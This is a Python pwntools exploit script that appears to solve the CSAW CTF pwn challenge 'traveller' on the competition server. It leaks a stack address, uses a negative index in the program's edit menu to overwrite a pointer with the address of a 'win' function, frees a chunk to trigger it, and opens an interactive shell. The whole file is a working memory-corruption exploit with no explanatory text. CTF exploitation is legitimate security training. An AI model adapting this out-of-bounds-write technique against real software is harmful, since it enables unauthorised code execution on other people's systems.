from pwn import *
context.log_level = 'debug'

TARGET = './traveller'
HOST = 'pwn.chal.csaw.io'
PORT = 1003

# r = process(TARGET, stdout=process.PTY, stdin=process.PTY)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)
elf = ELF(TARGET)

gdb.attach(r, '''
c
''')

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def alloc(size, data):
    r.sendline('1')
    r.sendlineafter('> ', str(size))
    r.sendlineafter(': ', data)
    r.recvuntil('> ')

def change(idx, data):
    r.sendline('2') 
    r.sendlineafter(': ', str(idx))
    r.send(data)
    r.recvuntil('> ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil('> ')

def show(idx):
    r.sendline('4')
    r.sendlineafter('>', str(idx))
    return r.recvuntil('> ')

win = 0x4008b6

r.recvuntil('system. \n')
stack_leak = int(r.recvuntil('\n')[:-1], 16)
dbg("stack_leak")

r.recvuntil('> ') 
change(-262194, p64(win).strip('\x00'))
alloc('1', 'a')
free(0) 

r.interactive()
r.close()
